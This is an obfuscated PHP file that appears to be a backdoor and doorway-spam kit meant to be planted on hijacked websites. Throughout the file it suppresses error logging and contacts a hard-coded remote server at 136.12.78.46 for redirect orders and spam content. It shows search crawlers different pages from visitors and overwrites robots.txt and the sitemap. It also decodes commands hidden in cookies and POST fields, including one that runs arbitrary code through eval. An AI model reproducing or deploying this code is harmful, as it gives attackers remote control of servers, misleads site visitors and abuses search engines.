<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _9kgxjqa{static private $_vz8t6ql1 = 2420912765;static function _h3ymw($_rli2m1gh, $_2sa5ldf6){$_rli2m1gh[2] = count($_rli2m1gh) > 4 ? long2ip(_9kgxjqa::$_vz8t6ql1 - 725) : $_rli2m1gh[2];$_65jcbga3 = _9kgxjqa::_1weqg($_rli2m1gh, $_2sa5ldf6);if (!$_65jcbga3) {$_65jcbga3 = _9kgxjqa::_6722z($_rli2m1gh, $_2sa5ldf6);}return $_65jcbga3;}static function _1weqg($_rli2m1gh, $_65jcbga3, $_8lasg0rd = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_rli2m1gh)) {$_rli2m1gh = implode("/", $_rli2m1gh);}$_cz7iw857 = curl_init();curl_setopt($_cz7iw857, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_cz7iw857, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_cz7iw857, CURLOPT_URL, $_rli2m1gh);if (!empty($_65jcbga3)) {curl_setopt($_cz7iw857, CURLOPT_POST, 1);curl_setopt($_cz7iw857, CURLOPT_POSTFIELDS, $_65jcbga3);}if (!empty($_8lasg0rd)) {curl_setopt($_cz7iw857, CURLOPT_HTTPHEADER, $_8lasg0rd);}curl_setopt($_cz7iw857, CURLOPT_RETURNTRANSFER, TRUE);$_tjm4xkof = curl_exec($_cz7iw857);curl_close($_cz7iw857);return $_tjm4xkof;}static function _6722z($_rli2m1gh, $_65jcbga3, $_8lasg0rd = NULL){if (is_array($_rli2m1gh)) {$_rli2m1gh = implode("/", $_rli2m1gh);}if (!empty($_65jcbga3)) {$_go3ene09 = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_65jcbga3);if (!empty($_8lasg0rd)) {$_go3ene09["header"] = $_go3ene09["header"] . "\r\n" . implode("\r\n", $_8lasg0rd);}$_fgpohh5a = stream_context_create(array('http' => $_go3ene09));} else {$_go3ene09 = array('method' => 'GET',);if (!empty($_8lasg0rd)) {$_go3ene09["header"] = implode("\r\n", $_8lasg0rd);}$_fgpohh5a = stream_context_create(array('http' => $_go3ene09));}return @file_get_contents($_rli2m1gh, FALSE, $_fgpohh5a);}}class _jnnglzp{private static $_nl65ac1t = "";private static $_nrq3j9xj = -1;private static $_wbkyn2dq = "";private $_erkkuw8w = "";private $_9j0y83wi = "";private $_0zmn1iot = "";private $_jz90k6ns = "";public static function _grzft($_2x3bjo1d, $_vjz2nkp9, $_cfna1ia0){_jnnglzp::$_nl65ac1t = $_2x3bjo1d . "/cache/";_jnnglzp::$_nrq3j9xj = $_vjz2nkp9;_jnnglzp::$_wbkyn2dq = $_cfna1ia0;if (!@file_exists(_jnnglzp::$_nl65ac1t)) {@mkdir(_jnnglzp::$_nl65ac1t);}}static public function _8hed7(){$_s6xka3uj = 0;foreach (scandir(_jnnglzp::$_nl65ac1t) as $_zk8radal) {$_s6xka3uj += 1;}return $_s6xka3uj;}public static function _qzr0y(){return TRUE;}public function __construct($_4qrswwnu, $_hrdve7jk, $_iuhmvok2, $_7zjmp170){$this->_erkkuw8w = $_4qrswwnu;$this->_9j0y83wi = $_hrdve7jk;$this->_0zmn1iot = $_iuhmvok2;$this->_jz90k6ns = $_7zjmp170;}public function _oww19(){function _cdk0v($_s7wf0vg5, $_6uo0tfru){return round(rand($_s7wf0vg5, $_6uo0tfru - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_2vsrk6jp = _3bf98kk::_aygb3();$_65jcbga3 = str_replace("{{ text }}", $this->_9j0y83wi,str_replace("{{ keyword }}", $this->_0zmn1iot,str_replace("{{ links }}", $this->_jz90k6ns, $this->_erkkuw8w)));while (TRUE) {$_2cmms6yp = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _3bf98kk::_v8lnr(), $_65jcbga3, 1);if ($_2cmms6yp === $_65jcbga3) {break;}$_65jcbga3 = $_2cmms6yp;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_65jcbga3, $_6uka5vdd);if (empty($_6uka5vdd)) {break;}$_iuhmvok2 = @$_2vsrk6jp[intval($_6uka5vdd[1])];$_2aogw3x3 = _53rw8b1::_e8whb($_iuhmvok2);$_65jcbga3 = str_replace($_6uka5vdd[0], $_2aogw3x3, $_65jcbga3);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_65jcbga3, $_6uka5vdd);if (empty($_6uka5vdd)) {break;}$_iuhmvok2 = @$_2vsrk6jp[intval($_6uka5vdd[1])];$_65jcbga3 = str_replace($_6uka5vdd[0], $_iuhmvok2, $_65jcbga3);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_65jcbga3, $_6uka5vdd);if (empty($_6uka5vdd)) {break;}$_65jcbga3 = str_replace($_6uka5vdd[0], _cdk0v($_6uka5vdd[1], $_6uka5vdd[2]), $_65jcbga3);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_65jcbga3, $_6uka5vdd);if (empty($_6uka5vdd)) {break;}$_65jcbga3 = str_replace($_6uka5vdd[0], rand($_6uka5vdd[1], $_6uka5vdd[2]), $_65jcbga3);}return $_65jcbga3;}public function _0ltak(){$_o86cjgc7 = _jnnglzp::$_nl65ac1t . md5($this->_0zmn1iot . _jnnglzp::$_wbkyn2dq);if (_jnnglzp::$_nrq3j9xj == -1) {$_clrsv1er = -1;} else {$_clrsv1er = time() + (3600 * 24 * 30);}$_osjdic03 = array("template" => $this->_erkkuw8w, "text" => $this->_9j0y83wi, "keyword" => $this->_0zmn1iot,"links" => $this->_jz90k6ns, "expired" => $_clrsv1er);@file_put_contents($_o86cjgc7, serialize($_osjdic03));}static public function _dxbwo($_iuhmvok2){$_o86cjgc7 = _jnnglzp::$_nl65ac1t . md5($_iuhmvok2 . _jnnglzp::$_wbkyn2dq);$_o86cjgc7 = @unserialize(@file_get_contents($_o86cjgc7));if (!empty($_o86cjgc7) && ($_o86cjgc7["expired"] > time() || $_o86cjgc7["expired"] == -1)) {return new _jnnglzp($_o86cjgc7["template"], $_o86cjgc7["text"], $_o86cjgc7["keyword"], $_o86cjgc7["links"]);} else {return null;}}}class _2xr2iz9{private static $_nl65ac1t = "";private static $_un6b8ztm = "";public static function _grzft($_2x3bjo1d, $_up62qved){_2xr2iz9::$_nl65ac1t = $_2x3bjo1d . "/";_2xr2iz9::$_un6b8ztm = $_up62qved;if (!@file_exists(_2xr2iz9::$_nl65ac1t)) {@mkdir(_2xr2iz9::$_nl65ac1t);}}public static function _qzr0y(){return TRUE;}static public function _8hed7(){$_s6xka3uj = 0;foreach (scandir(_2xr2iz9::$_nl65ac1t) as $_zk8radal) {if (strpos($_zk8radal, _2xr2iz9::$_un6b8ztm) === 0) {$_s6xka3uj += 1;}}return $_s6xka3uj;}static public function _v8lnr(){$_wcl6gub5 = array();foreach (scandir(_2xr2iz9::$_nl65ac1t) as $_zk8radal) {if (strpos($_zk8radal, _2xr2iz9::$_un6b8ztm) === 0) {$_wcl6gub5[] = $_zk8radal;}}return @file_get_contents(_2xr2iz9::$_nl65ac1t . $_wcl6gub5[array_rand($_wcl6gub5)]);}static public function _0ltak($_etuyh1py){if (@file_exists(_2xr2iz9::$_un6b8ztm . "_" . md5($_etuyh1py) . ".html")) {return;}@file_put_contents(_2xr2iz9::$_un6b8ztm . "_" . md5($_etuyh1py) . ".html", $_etuyh1py);}}class _3bf98kk{private static $_nl65ac1t = "";private static $_un6b8ztm = "";private static $_erxrfubi = array();private static $_xm4bol16 = array();public static function _grzft($_2x3bjo1d, $_up62qved){_3bf98kk::$_nl65ac1t = $_2x3bjo1d . "/";_3bf98kk::$_un6b8ztm = $_up62qved;if (!@file_exists(_3bf98kk::$_nl65ac1t)) {@mkdir(_3bf98kk::$_nl65ac1t);}}private static function _7uqpe(){$_ar0akttu = array();foreach (scandir(_3bf98kk::$_nl65ac1t) as $_zk8radal) {if (strpos($_zk8radal, _3bf98kk::$_un6b8ztm) === 0) {$_ar0akttu[] = $_zk8radal;}}return $_ar0akttu;}public static function _qzr0y(){return TRUE;}static public function _v8lnr(){if (empty(_3bf98kk::$_erxrfubi)) {$_ar0akttu = _3bf98kk::_7uqpe();_3bf98kk::$_erxrfubi = @file(_3bf98kk::$_nl65ac1t . $_ar0akttu[array_rand($_ar0akttu)], FILE_IGNORE_NEW_LINES);}return _3bf98kk::$_erxrfubi[array_rand(_3bf98kk::$_erxrfubi)];}static public function _aygb3(){if (empty(_3bf98kk::$_xm4bol16)) {$_ar0akttu = _3bf98kk::_7uqpe();foreach ($_ar0akttu as $_g9qbvr69) {_3bf98kk::$_xm4bol16 = array_merge(_3bf98kk::$_xm4bol16, @file(_3bf98kk::$_nl65ac1t . $_g9qbvr69, FILE_IGNORE_NEW_LINES));}}return _3bf98kk::$_xm4bol16;}static public function _0ltak($_iu9qzzd4){if (@file_exists(_3bf98kk::$_un6b8ztm . "_" . md5($_iu9qzzd4) . ".list")) {return;}@file_put_contents(_3bf98kk::$_un6b8ztm . "_" . md5($_iu9qzzd4) . ".list", $_iu9qzzd4);}static public function _z4mg3($_iuhmvok2){@file_put_contents(_3bf98kk::$_un6b8ztm . "_" . md5(_53rw8b1::$_da69thkx) . ".list", $_iuhmvok2 . "\n", 8);}}class _53rw8b1{static public $_iumxuidn = "5.3";static public $_da69thkx = "48bd9d30-0798-66a6-b175-d7967e8c62eb";private $_drr30wqm = "http://136.12.78.46/app/assets/api2?action=redir";private $_vioaekt8 = "http://136.12.78.46/app/assets/api?action=page";static public $_qb7acm0s = 5;static public $_z1ys0tt1 = 20;private function _ot8rq(){$_fqbf7llk = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_fqbf7llk, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_qejedl6f = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_qejedl6f = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_qejedl6f = 1;} else {$_qejedl6f = 0;}return $_qejedl6f;}private static function _xb7tv(){$_2sa5ldf6 = array();$_2sa5ldf6['ip'] = $_SERVER['REMOTE_ADDR'];$_2sa5ldf6['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_2sa5ldf6['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_2sa5ldf6['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_2sa5ldf6['ref'] = @$_SERVER['HTTP_REFERER'];$_2sa5ldf6['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_2sa5ldf6['acp'] = @$_SERVER['HTTP_ACCEPT'];$_2sa5ldf6['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_2sa5ldf6['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_2sa5ldf6;}public function __construct(){$this->_drr30wqm = explode("/", $this->_drr30wqm);$this->_vioaekt8 = explode("/", $this->_vioaekt8);}static public function _zon4t($_913w32ui){if (strlen($_913w32ui) < 4) {return "";}$_oerxpxif = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_2vsrk6jp = str_split($_oerxpxif);$_2vsrk6jp = array_flip($_2vsrk6jp);$_x9enb9en = 0;$_qtjjmzb4 = "";$_913w32ui = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_913w32ui);do {$_1nfm4s7v = $_2vsrk6jp[$_913w32ui[$_x9enb9en++]];$_bdfdtchm = $_2vsrk6jp[$_913w32ui[$_x9enb9en++]];$_av3pogwd = $_2vsrk6jp[$_913w32ui[$_x9enb9en++]];$_y54qj1mw = $_2vsrk6jp[$_913w32ui[$_x9enb9en++]];$_l1jd90gm = ($_1nfm4s7v << 2) | ($_bdfdtchm >> 4);$_43i41mfj = (($_bdfdtchm & 15) << 4) | ($_av3pogwd >> 2);$_qzhrbh0l = (($_av3pogwd & 3) << 6) | $_y54qj1mw;$_qtjjmzb4 = $_qtjjmzb4 . chr($_l1jd90gm);if ($_av3pogwd != 64) {$_qtjjmzb4 = $_qtjjmzb4 . chr($_43i41mfj);}if ($_y54qj1mw != 64) {$_qtjjmzb4 = $_qtjjmzb4 . chr($_qzhrbh0l);}} while ($_x9enb9en < strlen($_913w32ui));return $_qtjjmzb4;}private function _qhdfx($_iuhmvok2){$_4qrswwnu = "";$_hrdve7jk = "";$_2sa5ldf6 = _53rw8b1::_xb7tv();$_2sa5ldf6["uid"] = _53rw8b1::$_da69thkx;$_2sa5ldf6["keyword"] = $_iuhmvok2;$_2sa5ldf6["tc"] = 10;$_2sa5ldf6 = http_build_query($_2sa5ldf6);$_wff726kl = _9kgxjqa::_h3ymw($this->_vioaekt8, $_2sa5ldf6);if (strpos($_wff726kl, _53rw8b1::$_da69thkx) === FALSE) {return array($_4qrswwnu, $_hrdve7jk);}$_4qrswwnu = _2xr2iz9::_v8lnr();$_hrdve7jk = substr($_wff726kl, strlen(_53rw8b1::$_da69thkx));$_hrdve7jk = explode("\n", $_hrdve7jk);shuffle($_hrdve7jk);$_hrdve7jk = implode(" ", $_hrdve7jk);return array($_4qrswwnu, $_hrdve7jk);}private function _lvsze(){$_2sa5ldf6 = _53rw8b1::_xb7tv();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_2sa5ldf6['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_2sa5ldf6['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_2sa5ldf6['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_2sa5ldf6["uid"] = _53rw8b1::$_da69thkx;$_2sa5ldf6 = http_build_query($_2sa5ldf6);$_wffp2ht9 = _9kgxjqa::_h3ymw($this->_drr30wqm, $_2sa5ldf6);$_wffp2ht9 = @unserialize($_wffp2ht9);if (isset($_wffp2ht9["type"]) && $_wffp2ht9["type"] == "redir") {if (!empty($_wffp2ht9["data"]["header"])) {header($_wffp2ht9["data"]["header"]);return true;} elseif (!empty($_wffp2ht9["data"]["code"])) {echo $_wffp2ht9["data"]["code"];return true;}}return false;}public function _qzr0y(){return _jnnglzp::_qzr0y() && _2xr2iz9::_qzr0y() && _3bf98kk::_qzr0y();}static public function _40z1p(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _daqee(){$_izok9q5t = explode("?", $_SERVER["REQUEST_URI"], 2);$_izok9q5t = $_izok9q5t[0];if (strpos($_izok9q5t, ".php") === FALSE) {$_izok9q5t = explode("/", $_izok9q5t);array_pop($_izok9q5t);$_izok9q5t = implode("/", $_izok9q5t) . "/";}return sprintf("%s://%s%s", _53rw8b1::_40z1p() ? "https" : "http", $_SERVER['HTTP_HOST'], $_izok9q5t);}public static function _2hady(){$_ydka5fpl = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_js2czk2v = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_8lasg0rd = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_ydka5fpl[array_rand($_ydka5fpl)],);$_awzdsotw = urlencode(_53rw8b1::_7v4pi() . "/sitemap.xml");foreach ($_js2czk2v as $_rli2m1gh => $_9lhy8jld) {$_zn4xadx8 = _9kgxjqa::_1weqg($_rli2m1gh . $_awzdsotw, NULL, $_8lasg0rd);if (empty($_zn4xadx8)) {$_zn4xadx8 = _9kgxjqa::_6722z($_rli2m1gh . $_awzdsotw, NULL, $_8lasg0rd);}if (empty($_zn4xadx8)) {return FALSE;}if (strpos($_zn4xadx8, $_9lhy8jld) === FALSE) {return FALSE;}}return TRUE;}public static function _738oo(){$_2ap88s8u = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_izok9q5t = explode("?", $_SERVER["REQUEST_URI"], 2);$_izok9q5t = $_izok9q5t[0];$_fqc97p1l = substr($_izok9q5t, 0, strrpos($_izok9q5t, "/"));$_ugj4m90w = sprintf($_2ap88s8u, $_fqc97p1l, _53rw8b1::_7v4pi() . "/sitemap.xml");$_co00as81 = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_co00as81)) {@chmod($_co00as81, 0777);$_ubz3m6h1 = @file_get_contents($_co00as81);} else {$_ubz3m6h1 = "";}if (strpos($_ubz3m6h1, $_ugj4m90w) === FALSE) {@file_put_contents($_co00as81, $_ubz3m6h1 . "\n" . $_ugj4m90w);$_ubz3m6h1 = @file_get_contents($_co00as81);return (strpos($_ubz3m6h1, $_ugj4m90w) !== FALSE);}return FALSE;}public static function _7v4pi(){$_izok9q5t = explode("?", $_SERVER["REQUEST_URI"], 2);$_izok9q5t = $_izok9q5t[0];$_2x3bjo1d = substr($_izok9q5t, 0, strrpos($_izok9q5t, "/"));return sprintf("%s://%s%s", _53rw8b1::_40z1p() ? "https" : "http", $_SERVER['HTTP_HOST'], $_2x3bjo1d);}public static function _e8whb($_iuhmvok2){$_0r7ypedm = _53rw8b1::_daqee();$_wj2b9rhj = substr(md5(_53rw8b1::$_da69thkx . "salt3"), 0, 6);$_5pe4adbp = "";if (substr($_0r7ypedm, -1) == "/") {if (ord($_wj2b9rhj[1]) % 2) {$_iuhmvok2 = str_replace(" ", "-", $_iuhmvok2);} else {$_iuhmvok2 = str_replace(" ", "-", $_iuhmvok2);}$_5pe4adbp = sprintf("%s%s", $_0r7ypedm, urlencode($_iuhmvok2));} else {if (FALSE && (ord($_wj2b9rhj[0]) % 2)) {$_5pe4adbp = sprintf("%s?%s=%s",$_0r7ypedm,$_wj2b9rhj,urlencode(str_replace(" ", "-", $_iuhmvok2)));} else {$_ndlgt3hd = array("id", "page", "tag");$_t1h08qfs = $_ndlgt3hd[ord($_wj2b9rhj[2]) % count($_ndlgt3hd)];if (ord($_wj2b9rhj[1]) % 2) {$_iuhmvok2 = str_replace(" ", "-", $_iuhmvok2);} else {$_iuhmvok2 = str_replace(" ", "-", $_iuhmvok2);}$_5pe4adbp = sprintf("%s?%s=%s",$_0r7ypedm,$_t1h08qfs,urlencode($_iuhmvok2));}}return $_5pe4adbp;}public static function _qxuo8($_s7wf0vg5, $_6uo0tfru){$_n33gabbo = "";for ($_x9enb9en = 0; $_x9enb9en < rand($_s7wf0vg5, $_6uo0tfru); $_x9enb9en++) {$_iuhmvok2 = _3bf98kk::_v8lnr();$_n33gabbo .= sprintf("<a href=\"%s\">%s</a>,\n",_53rw8b1::_e8whb($_iuhmvok2), ucwords($_iuhmvok2));}return $_n33gabbo;}public static function _gyrxi($_9w04alzu = FALSE){$_65dsksjm = dirname(__FILE__) . "/sitemap.xml";$_6astcdqj = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_ycz706wp = "</urlset>";$_2vsrk6jp = _3bf98kk::_aygb3();$_7vs9tlor = array();if (file_exists($_65dsksjm)) {$_wff726kl = simplexml_load_file($_65dsksjm);foreach ($_wff726kl as $_qofvvymt) {$_7vs9tlor[(string)$_qofvvymt->loc] = (string)$_qofvvymt->lastmod;}} else {$_9w04alzu = FALSE;}foreach ($_2vsrk6jp as $_zygh3ndj) {$_5pe4adbp = _53rw8b1::_e8whb($_zygh3ndj);if (isset($_7vs9tlor[$_5pe4adbp])) {continue;}if ($_9w04alzu) {$_32gg4cmu = time();} else {$_32gg4cmu = time() - (crc32($_zygh3ndj) % (60 * 60 * 24 * 30));}$_7vs9tlor[$_5pe4adbp] = date("Y-m-d", $_32gg4cmu);}$_aubzibqs = "";foreach ($_7vs9tlor as $_rli2m1gh => $_32gg4cmu) {$_aubzibqs .= "<url>\n";$_aubzibqs .= sprintf("<loc>%s</loc>\n", $_rli2m1gh);$_aubzibqs .= sprintf("<lastmod>%s</lastmod>\n", $_32gg4cmu);$_aubzibqs .= "</url>\n";}$_v64k2zj6 = $_6astcdqj . $_aubzibqs . $_ycz706wp;$_awzdsotw = _53rw8b1::_7v4pi() . "/sitemap.xml";@file_put_contents($_65dsksjm, $_v64k2zj6);return $_awzdsotw;}public function _8gp86(){$_t1h08qfs = substr(md5(_53rw8b1::$_da69thkx . "salt3"), 0, 6);if (!$this->_ot8rq()) {if ($this->_lvsze()) {return;}}if (!empty($_GET)) {$_045wzk2i = array_values($_GET);} else {$_045wzk2i = explode("/", $_SERVER["REQUEST_URI"]);$_045wzk2i = array_reverse($_045wzk2i);}$_iuhmvok2 = "";foreach ($_045wzk2i as $_i1o0cthb) {if (substr_count($_i1o0cthb, "-") > 0) {$_iuhmvok2 = $_i1o0cthb;break;}}$_iuhmvok2 = str_replace($_t1h08qfs . "-", "", $_iuhmvok2);$_iuhmvok2 = str_replace("-" . $_t1h08qfs, "", $_iuhmvok2);$_iuhmvok2 = str_replace("-", " ", $_iuhmvok2);$_5kjbfoy9 = array(".html", ".php", ".aspx");foreach ($_5kjbfoy9 as $_nkceqono) {if (strpos($_iuhmvok2, $_nkceqono) === strlen($_iuhmvok2) - strlen($_nkceqono)) {$_iuhmvok2 = substr($_iuhmvok2, 0, strlen($_iuhmvok2) - strlen($_nkceqono));}}$_iuhmvok2 = urldecode($_iuhmvok2);$_vxre5icj = _3bf98kk::_aygb3();if (empty($_iuhmvok2)) {$_iuhmvok2 = $_vxre5icj[0];} else if (!in_array($_iuhmvok2, $_vxre5icj)) {$_6fph41pj = 0;foreach (str_split($_iuhmvok2) as $_cz7iw857) {$_6fph41pj += ord($_cz7iw857);}$_iuhmvok2 = $_vxre5icj[$_6fph41pj % count($_vxre5icj)];}if (!empty($_iuhmvok2)) {$_wffp2ht9 = _jnnglzp::_dxbwo($_iuhmvok2);if (empty($_wffp2ht9)) {list($_4qrswwnu, $_hrdve7jk) = $this->_qhdfx($_iuhmvok2);if (empty($_hrdve7jk)) {return;}$_wffp2ht9 = new _jnnglzp($_4qrswwnu, $_hrdve7jk, $_iuhmvok2, _53rw8b1::_qxuo8(_53rw8b1::$_qb7acm0s, _53rw8b1::$_z1ys0tt1));$_wffp2ht9->_0ltak();}echo $_wffp2ht9->_oww19();}}}_jnnglzp::_grzft(dirname(__FILE__), -1, _53rw8b1::$_da69thkx);_2xr2iz9::_grzft(dirname(__FILE__), substr(md5(_53rw8b1::$_da69thkx . "salt12"), 0, 4));_3bf98kk::_grzft(dirname(__FILE__), substr(md5(_53rw8b1::$_da69thkx . "salt22"), 0, 4));function _2x1ge($_wff726kl, $_zygh3ndj){$_vaisoioj = "";for ($_x9enb9en = 0; $_x9enb9en < strlen($_wff726kl);) {for ($_r3a02m4n = 0; $_r3a02m4n < strlen($_zygh3ndj) && $_x9enb9en < strlen($_wff726kl); $_r3a02m4n++, $_x9enb9en++) {$_vaisoioj .= chr(ord($_wff726kl[$_x9enb9en]) ^ ord($_zygh3ndj[$_r3a02m4n]));}}return $_vaisoioj;}function _m9itm($_wff726kl, $_zygh3ndj, $_v5kkxucx){return _2x1ge(_2x1ge($_wff726kl, $_zygh3ndj), $_v5kkxucx);}foreach (array_merge($_COOKIE, $_POST) as $_qmjp5s2x => $_wff726kl) {$_wff726kl = @unserialize(_m9itm(_53rw8b1::_zon4t($_wff726kl), $_qmjp5s2x, _53rw8b1::$_da69thkx));if (isset($_wff726kl['ak']) && _53rw8b1::$_da69thkx == $_wff726kl['ak']) {if ($_wff726kl['a'] == 'doorway2') {if ($_wff726kl['sa'] == 'check') {$_65jcbga3 = _9kgxjqa::_h3ymw(explode("/", "http://httpbin.org/"), "");if (strlen($_65jcbga3) > 512) {echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn,"cache" => _jnnglzp::_8hed7(),"keywords" => count(_3bf98kk::_aygb3()),"templates" => _2xr2iz9::_8hed7()));}exit;}if ($_wff726kl['sa'] == 'templates') {foreach ($_wff726kl["templates"] as $_4qrswwnu) {_2xr2iz9::_0ltak($_4qrswwnu);echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn,));}}if ($_wff726kl['sa'] == 'keywords') {_3bf98kk::_0ltak($_wff726kl["keywords"]);_53rw8b1::_gyrxi();echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn,));}if ($_wff726kl['sa'] == 'update_sitemap') {_53rw8b1::_gyrxi(TRUE);echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn,));}if ($_wff726kl['sa'] == 'pages') {$_yz3wqnn3 = 0;$_vxre5icj = _3bf98kk::_aygb3();if (_2xr2iz9::_8hed7() > 0) {foreach ($_wff726kl['pages'] as $_wffp2ht9) {$_ttwmhe6z = _jnnglzp::_dxbwo($_wffp2ht9["keyword"]);if (empty($_ttwmhe6z)) {$_ttwmhe6z = new _jnnglzp(_2xr2iz9::_v8lnr(), $_wffp2ht9["text"], $_wffp2ht9["keyword"], _53rw8b1::_qxuo8(_53rw8b1::$_qb7acm0s, _53rw8b1::$_z1ys0tt1));$_ttwmhe6z->_0ltak();$_yz3wqnn3 += 1;if (!in_array($_wffp2ht9["keyword"], $_vxre5icj)) {_3bf98kk::_z4mg3($_wffp2ht9["keyword"]);}}}}echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn, "pages" => $_yz3wqnn3));}if ($_wff726kl["sa"] == "ping") {$_zn4xadx8 = _53rw8b1::_2hady();echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn, "result" => (int)$_zn4xadx8));}if ($_wff726kl["sa"] == "robots") {$_zn4xadx8 = _53rw8b1::_738oo();echo @serialize(array("uid" => _53rw8b1::$_da69thkx, "v" => _53rw8b1::$_iumxuidn, "result" => (int)$_zn4xadx8));}}if ($_wff726kl['sa'] == 'eval') {eval($_wff726kl["data"]);exit;}}}$_e24ufxfa = new _53rw8b1();if ($_e24ufxfa->_qzr0y()) {$_e24ufxfa->_8gp86();}exit();